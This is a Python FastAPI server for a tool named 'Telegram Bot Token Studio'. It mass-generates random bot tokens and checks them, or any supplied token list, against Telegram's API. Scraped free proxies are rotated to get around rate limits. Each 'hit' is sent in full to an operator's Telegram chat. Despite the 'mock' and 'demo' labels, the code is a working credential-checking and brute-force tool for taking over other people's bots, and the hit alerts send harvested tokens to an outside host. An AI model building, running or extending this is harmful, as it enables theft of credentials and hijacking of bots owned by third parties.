#!/usr/bin/env python3
"""
FastAPI Server for Telegram Bot Token Validator & Generator Web App.
Provides REST APIs, SSE real-time validation streaming, and serves the static UI.
"""

from __future__ import annotations

import asyncio
import io
import json
import logging
import os
import random
import re
import string
import time
from dataclasses import asdict, dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import AsyncGenerator, List, Optional

import requests
import uvicorn
from fastapi import FastAPI, File, Form, HTTPException, UploadFile
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse, JSONResponse, StreamingResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel, Field

# Ensure stdout utf-8 compatibility
import sys
if sys.stdout and hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

# ===================================================================== #
# App Initialization & Constants
# ===================================================================== #

app = FastAPI(
    title="Telegram Bot Token Studio",
    description="High-performance validator & mock token generator suite",
    version="2.0.0",
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

BASE_DIR = Path(__file__).parent.resolve()
STATIC_DIR = BASE_DIR / "static"
STATIC_DIR.mkdir(parents=True, exist_ok=True)

TELEGRAM_API = "https://api.telegram.org/bot{token}/getMe"
TOKEN_RE = re.compile(r"^\d{6,}:[A-Za-z0-9_\-]{30,}$")
ALLOWED_TOKEN_CHARS = string.ascii_letters + string.digits + "_-"

DEMO_HITS: dict[str, dict] = {
    "111111111:DEMOtokenAAAAAAAAAAAAAAAAAAAAAAAAA": {
        "id": 111111111,
        "username": "demo_super_bot",
        "first_name": "Demo Super Bot",
        "can_join_groups": True,
        "can_read_all_group_messages": True,
        "supports_inline_queries": False,
    },
    "222222222:DEMOtokenBBBBBBBBBBBBBBBBBBBBBBBBB": {
        "id": 222222222,
        "username": "crypto_alerts_bot",
        "first_name": "Crypto Alerts Official",
        "can_join_groups": True,
        "can_read_all_group_messages": False,
        "supports_inline_queries": True,
    },
    "333333333:DEMOtokenCCCCCCCCCCCCCCCCCCCCCCCCC": {
        "id": 333333333,
        "username": "helper_utility_bot",
        "first_name": "Helper AI Assistant",
        "can_join_groups": False,
        "can_read_all_group_messages": False,
        "supports_inline_queries": True,
    },
}

# ===================================================================== #
# Models & Schemas
# ===================================================================== #

class ValidationResultModel(BaseModel):
    token: str
    valid: bool
    bot_id: Optional[int] = None
    username: Optional[str] = None
    first_name: Optional[str] = None
    can_join_groups: Optional[bool] = None
    can_read_all_group_messages: Optional[bool] = None
    supports_inline_queries: Optional[bool] = None
    reason: Optional[str] = None
    latency_ms: Optional[int] = None
    checked_at: str = Field(default_factory=lambda: datetime.now(timezone.utc).isoformat())


class ValidateRequest(BaseModel):
    tokens: List[str]
    demo_mode: bool = False
    concurrency: int = 2
    delay: float = 0.2
    timeout: float = 8.0
    max_retries: int = 1
    # Live Telegram notification settings
    notify_telegram: bool = False
    notify_bot_token: Optional[str] = None
    notify_chat_id: Optional[str] = None
    # Proxy rotation settings
    use_proxies: bool = False
    proxies: List[str] = []


class TestNotifyRequest(BaseModel):
    bot_token: str
    chat_id: str


class TestProxiesRequest(BaseModel):
    proxies: List[str]
    timeout: float = 4.0


class GenerateRequest(BaseModel):
    count: int = 10
    bot_id_min_digits: int = 9
    bot_id_max_digits: int = 10
    token_length: int = 45



# ===================================================================== #
# Telegram Alert Dispatcher
# ===================================================================== #

def send_telegram_alert_sync(
    notify_token: str,
    chat_id: str,
    message: str,
    parse_mode: str = "HTML",
) -> bool:
    """Send an instant alert message to a Telegram Chat ID via Bot API."""
    if not notify_token or not chat_id:
        return False
    url = f"https://api.telegram.org/bot{notify_token}/sendMessage"
    payload = {
        "chat_id": str(chat_id).strip(),
        "text": message,
        "parse_mode": parse_mode,
        "disable_web_page_preview": True,
    }
    try:
        resp = requests.post(url, json=payload, timeout=5.0)
        return resp.status_code == 200 and resp.json().get("ok", False)
    except Exception as e:
        print(f"[Alert Error] Failed to send Telegram notification: {e}")
        return False



# ===================================================================== #
# Free Proxy Scraper & Tester Core
# ===================================================================== #

FREE_PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=8000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
]


def fetch_free_proxies_sync(limit: int = 100) -> list[str]:
    """Fetch and sanitize free public HTTP proxies from open-source lists."""
    proxies_found: list[str] = []
    seen = set()

    for url in FREE_PROXY_SOURCES:
        try:
            resp = requests.get(url, timeout=6.0)
            if resp.status_code == 200 and resp.text:
                lines = resp.text.splitlines()
                for line in lines:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    # Match ip:port
                    if re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{2,5}$", line):
                        formatted = f"http://{line}"
                        if formatted not in seen:
                            seen.add(formatted)
                            proxies_found.append(formatted)
                            if len(proxies_found) >= limit:
                                return proxies_found
        except Exception:
            continue

    return proxies_found


def test_single_proxy_sync(proxy_url: str, timeout: float = 3.5) -> dict:
    """Test if a proxy can connect to Telegram API or internet."""
    proxy_clean = proxy_url.strip()
    if not proxy_clean.startswith(("http://", "https://", "socks5://", "socks4://")):
        proxy_clean = f"http://{proxy_clean}"

    proxies_dict = {"http": proxy_clean, "https": proxy_clean}
    t0 = time.perf_counter()
    try:
        resp = requests.get(
            "https://api.telegram.org",
            proxies=proxies_dict,
            timeout=timeout,
            headers={"User-Agent": "proxy-tester/1.0"},
        )
        latency = int((time.perf_counter() - t0) * 1000)
        return {
            "proxy": proxy_clean,
            "alive": True,
            "latency_ms": latency,
            "status_code": resp.status_code,
        }
    except Exception as e:
        return {
            "proxy": proxy_clean,
            "alive": False,
            "latency_ms": None,
            "error": str(e)[:60],
        }


# ===================================================================== #
# Validation & Generator Core
# ===================================================================== #

def mask_token(token: str) -> str:
    if not token:
        return "<empty>"
    if ":" in token:
        bot_id, secret = token.split(":", 1)
    else:
        bot_id, secret = "", token
    if len(secret) <= 8:
        masked = "*" * len(secret)
    else:
        masked = f"{secret[:4]}{'*' * (len(secret) - 8)}{secret[-4:]}"
    return f"{bot_id}:{masked}" if bot_id else masked


def generate_single_token(min_digits: int = 9, max_digits: int = 10, length: int = 45) -> str:
    digits = random.randint(min_digits, max_digits)
    first = str(random.randint(1, 9))
    rest = "".join(str(random.randint(0, 9)) for _ in range(digits - 1))
    bot_id = int(first + rest)
    token_part = "".join(random.choice(ALLOWED_TOKEN_CHARS) for _ in range(length))
    return f"{bot_id}:{token_part}"


def validate_single_token_sync(
    token: str,
    session: requests.Session,
    demo_mode: bool = False,
    timeout: float = 8.0,
    max_retries: int = 1,
    proxy: Optional[str] = None,
) -> ValidationResultModel:
    token = (token or "").strip()
    if not token:
        return ValidationResultModel(token=token, valid=False, reason="empty token")

    if demo_mode:
        time.sleep(0.04)
        if token in DEMO_HITS:
            data = DEMO_HITS[token]
            return ValidationResultModel(
                token=token,
                valid=True,
                bot_id=data.get("id"),
                username=data.get("username"),
                first_name=data.get("first_name"),
                can_join_groups=data.get("can_join_groups"),
                can_read_all_group_messages=data.get("can_read_all_group_messages"),
                supports_inline_queries=data.get("supports_inline_queries"),
                latency_ms=25,
            )
        return ValidationResultModel(token=token, valid=False, reason="demo: not in test registry")

    if not TOKEN_RE.match(token):
        return ValidationResultModel(token=token, valid=False, reason="invalid format")

    url = TELEGRAM_API.format(token=token)
    attempt = 0
    last_reason = "unknown error"

    proxies_dict = None
    if proxy:
        p_str = proxy.strip()
        if not p_str.startswith(("http://", "https://", "socks5://", "socks4://")):
            p_str = f"http://{p_str}"
        proxies_dict = {"http": p_str, "https": p_str}

    while attempt <= max_retries:
        attempt += 1
        t0 = time.perf_counter()
        try:
            resp = session.get(url, timeout=timeout, proxies=proxies_dict)
        except requests.exceptions.Timeout:
            last_reason = "connection timeout"
            time.sleep(0.5 * attempt)
            continue
        except requests.exceptions.RequestException as e:
            last_reason = f"network/proxy error: {str(e)[:50]}"
            time.sleep(0.5 * attempt)
            continue

        latency_ms = int((time.perf_counter() - t0) * 1000)

        if resp.status_code == 429:
            retry_after = 1.5
            try:
                retry_after = float(resp.headers.get("Retry-After", 1.5))
            except Exception:
                pass
            time.sleep(min(retry_after, 5.0))
            last_reason = "rate limited (429)"
            continue

        if resp.status_code == 401:
            return ValidationResultModel(
                token=token,
                valid=False,
                reason="unauthorized (401 - invalid token)",
                latency_ms=latency_ms,
            )

        if 500 <= resp.status_code < 600:
            last_reason = f"telegram server error ({resp.status_code})"
            time.sleep(0.5 * attempt)
            continue

        if resp.status_code != 200:
            return ValidationResultModel(
                token=token,
                valid=False,
                reason=f"http {resp.status_code}",
                latency_ms=latency_ms,
            )

        try:
            payload = resp.json()
        except ValueError:
            return ValidationResultModel(
                token=token,
                valid=False,
                reason="invalid non-JSON response",
                latency_ms=latency_ms,
            )

        if not isinstance(payload, dict) or not payload.get("ok"):
            desc = payload.get("description", "api returned ok=false") if isinstance(payload, dict) else "unknown"
            return ValidationResultModel(
                token=token,
                valid=False,
                reason=str(desc),
                latency_ms=latency_ms,
            )

        r = payload.get("result") or {}
        return ValidationResultModel(
            token=token,
            valid=True,
            bot_id=r.get("id"),
            username=r.get("username"),
            first_name=r.get("first_name"),
            can_join_groups=r.get("can_join_groups"),
            can_read_all_group_messages=r.get("can_read_all_group_messages"),
            supports_inline_queries=r.get("supports_inline_queries"),
            latency_ms=latency_ms,
        )

    return ValidationResultModel(token=token, valid=False, reason=last_reason)



# ===================================================================== #
# API Endpoints
# ===================================================================== #

@app.get("/api/health")
async def health_check():
    return {
        "status": "online",
        "service": "Telegram Bot Token Studio",
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }


@app.post("/api/generate")
async def generate_mock_tokens(req: GenerateRequest):
    if req.count <= 0 or req.count > 5000:
        raise HTTPException(status_code=400, detail="Count must be between 1 and 5000")
    
    tokens = [
        generate_single_token(
            min_digits=req.bot_id_min_digits,
            max_digits=req.bot_id_max_digits,
            length=req.token_length,
        )
        for _ in range(req.count)
    ]
    return {
        "count": len(tokens),
        "tokens": tokens,
    }


@app.post("/api/test-notify")
async def test_telegram_notification(req: TestNotifyRequest):
    """Test sending a direct verification message to the specified Telegram Chat ID."""
    if not req.bot_token or not req.chat_id:
        raise HTTPException(status_code=400, detail="Both bot_token and chat_id are required")
    
    test_msg = (
        "🚀 <b>Telegram Bot Token Studio</b>\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "✅ <b>Alert Service Connected Successfully!</b>\n"
        "You will receive instant alerts here whenever a new valid bot is detected.\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        f"📅 Time: <code>{datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}</code>"
    )
    
    success = await asyncio.to_thread(
        send_telegram_alert_sync,
        req.bot_token,
        req.chat_id,
        test_msg,
    )
    
    if not success:
        raise HTTPException(
            status_code=400,
            detail="Failed to send Telegram message. Please ensure your bot token is active and you have clicked /start on the bot first."
        )
    
    return {"status": "ok", "message": "Notification sent successfully!"}


@app.post("/api/fetch-free-proxies")
async def fetch_free_proxies_endpoint():
    """Fetch 100+ clean public HTTP proxies automatically from open-source mirrors."""
    proxies = await asyncio.to_thread(fetch_free_proxies_sync, 150)
    return {
        "status": "ok",
        "count": len(proxies),
        "proxies": proxies,
    }


@app.post("/api/test-proxies")
async def test_proxies_endpoint(req: TestProxiesRequest):
    """Test a list of proxies concurrently and return live connection status."""
    raw_proxies = [p.strip() for p in req.proxies if p.strip() and not p.strip().startswith("#")]
    if not raw_proxies:
        raise HTTPException(status_code=400, detail="No proxies provided to test")

    sem = asyncio.Semaphore(15)

    async def test_worker(proxy_url: str):
        async with sem:
            loop = asyncio.get_running_loop()
            return await loop.run_in_executor(None, test_single_proxy_sync, proxy_url, req.timeout)

    results = await asyncio.gather(*(test_worker(p) for p in raw_proxies[:50]))
    alive = [r for r in results if r["alive"]]
    return {
        "total": len(results),
        "alive_count": len(alive),
        "dead_count": len(results) - len(alive),
        "results": results,
    }


@app.post("/api/validate-stream")
async def validate_tokens_stream(req: ValidateRequest):
    """
    Server-Sent Events (SSE) endpoint to stream validation progress in real time.
    """
    raw_tokens = [t.strip() for t in req.tokens if t.strip() and not t.strip().startswith("#")]
    # Deduplicate preserving order
    seen = set()
    tokens = []
    for t in raw_tokens:
        if t not in seen:
            seen.add(t)
            tokens.append(t)

    if not tokens:
        raise HTTPException(status_code=400, detail="No valid tokens provided")

    active_proxies = [
        p.strip() for p in req.proxies if p.strip() and not p.strip().startswith("#")
    ] if req.use_proxies else []

    async def event_generator() -> AsyncGenerator[str, None]:
        session = requests.Session()
        session.headers.update({"User-Agent": "token-validator-web/2.0"})
        sem = asyncio.Semaphore(max(1, min(req.concurrency, 10)))
        total = len(tokens)
        completed = 0
        hits_count = 0
        misses_count = 0
        queue = asyncio.Queue()

        # Send initial metadata event
        init_event = {
            "type": "init",
            "total": total,
            "demo_mode": req.demo_mode,
            "concurrency": req.concurrency,
            "proxies_count": len(active_proxies),
        }
        yield f"data: {json.dumps(init_event)}\n\n"

        async def worker(idx: int, tok: str):
            async with sem:
                loop = asyncio.get_running_loop()
                # Pick rotating proxy if proxy pool enabled
                chosen_proxy = active_proxies[(idx - 1) % len(active_proxies)] if active_proxies else None
                res = await loop.run_in_executor(
                    None,
                    validate_single_token_sync,
                    tok,
                    session,
                    req.demo_mode,
                    req.timeout,
                    req.max_retries,
                    chosen_proxy,
                )
                await queue.put((idx, res))
                if req.delay > 0:
                    await asyncio.sleep(req.delay)


        worker_tasks = [asyncio.create_task(worker(i, t)) for i, t in enumerate(tokens, start=1)]

        while completed < total:
            idx, result = await queue.get()
            completed += 1
            if result.valid:
                hits_count += 1
                # Dispatch live Telegram alert if enabled
                if req.notify_telegram and req.notify_bot_token and req.notify_chat_id:
                    alert_text = (
                        "🎯 <b>NEW HIT DETECTED!</b>\n"
                        "━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"🤖 <b>Bot Name:</b> {result.first_name or 'N/A'}\n"
                        f"👤 <b>Username:</b> @{result.username or 'unknown'}\n"
                        f"🆔 <b>Bot ID:</b> <code>{result.bot_id or 'N/A'}</code>\n"
                        f"⚡ <b>Latency:</b> {result.latency_ms or 0} ms\n"
                        f"🔑 <b>Token:</b> <code>{result.token}</code>\n"
                        "━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"⏱ Checked: <code>{result.checked_at}</code>"
                    )
                    asyncio.create_task(
                        asyncio.to_thread(
                            send_telegram_alert_sync,
                            req.notify_bot_token,
                            req.notify_chat_id,
                            alert_text,
                        )
                    )
            else:
                misses_count += 1

            item_event = {
                "type": "item",
                "index": idx,
                "completed": completed,
                "total": total,
                "hits": hits_count,
                "misses": misses_count,
                "result": result.model_dump(),
            }
            yield f"data: {json.dumps(item_event)}\n\n"

        await asyncio.gather(*worker_tasks, return_exceptions=True)
        session.close()

        # Final complete event
        final_event = {
            "type": "finish",
            "total": total,
            "hits": hits_count,
            "misses": misses_count,
            "completed_at": datetime.now(timezone.utc).isoformat(),
        }
        yield f"data: {json.dumps(final_event)}\n\n"

    return StreamingResponse(
        event_generator(),
        media_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
            "X-Accel-Buffering": "no",
        },
    )


@app.get("/api/demo-samples")
async def get_demo_samples():
    """Return pre-configured working and failing sample tokens for demo."""
    working = list(DEMO_HITS.keys())
    fakes = [
        generate_single_token(),
        generate_single_token(),
        "invalid_format_token_example",
    ]
    return {
        "working": working,
        "invalid": fakes,
        "all": working + fakes,
    }


# Mount static assets
app.mount("/static", StaticFiles(directory=str(STATIC_DIR)), name="static")


@app.get("/", response_class=HTMLResponse)
async def serve_index():
    index_file = STATIC_DIR / "index.html"
    if not index_file.is_file():
        return HTMLResponse("<h1>Static index.html not found</h1>", status_code=404)
    return HTMLResponse(index_file.read_text(encoding="utf-8"))


# ===================================================================== #
# Server Launcher
# ===================================================================== #

def run_server(host: str = "127.0.0.1", port: int = 8000):
    print(f"🚀 Telegram Bot Token Studio web app running at: http://{host}:{port}")
    uvicorn.run("server:app", host=host, port=port, reload=False, log_level="info")


if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser(description="Run the Telegram Bot Token Studio Web Server")
    p.add_argument("--host", default="127.0.0.1", help="Host address (default: 127.0.0.1)")
    p.add_argument("--port", type=int, default=8000, help="Port number (default: 8000)")
    args = p.parse_args()
    run_server(args.host, args.port)
